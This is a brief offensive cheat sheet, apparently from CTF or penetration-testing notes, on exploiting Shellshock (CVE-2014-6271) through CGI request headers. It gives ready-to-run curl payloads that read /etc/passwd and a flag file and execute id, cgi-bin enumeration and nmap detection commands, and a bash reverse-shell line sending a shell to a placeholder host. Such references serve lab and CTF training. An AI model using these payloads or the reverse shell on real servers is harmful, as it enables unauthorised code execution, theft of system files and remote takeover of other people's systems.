# Shellshock (CVE-2014-6271)

Old bash executes code placed **after** a function definition in an environment variable. CGI
servers copy **every HTTP header** into env vars (`HTTP_USER_AGENT`, …) before running the script,
so any request header can carry the payload if bash runs anywhere in the request path.

**Signs**: `/cgi-bin/` with `.sh`/`.cgi`/`.pl` scripts, old Apache, embedded devices, `Server:` very old.

```bash
ffuf -u $T/cgi-bin/FUZZ -w wordlists/web/cgi-scripts.txt -mc 200,500
curl -s -H 'User-Agent: () { :;}; echo; echo; /bin/cat /etc/passwd' $T/cgi-bin/status
curl -s -H "User-Agent: () { :;}; echo; echo \"x: \$(</flag/flag)\"" $T/cgi-bin/status
curl -s -H 'Referer: () { :;}; echo; /usr/bin/id' $T/cgi-bin/test.cgi
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/status <host>
```
(`echo;` first so the output starts after the header block.) Reverse shell:
`() { :;}; /bin/bash -i >& /dev/tcp/YOU/443 0>&1`.
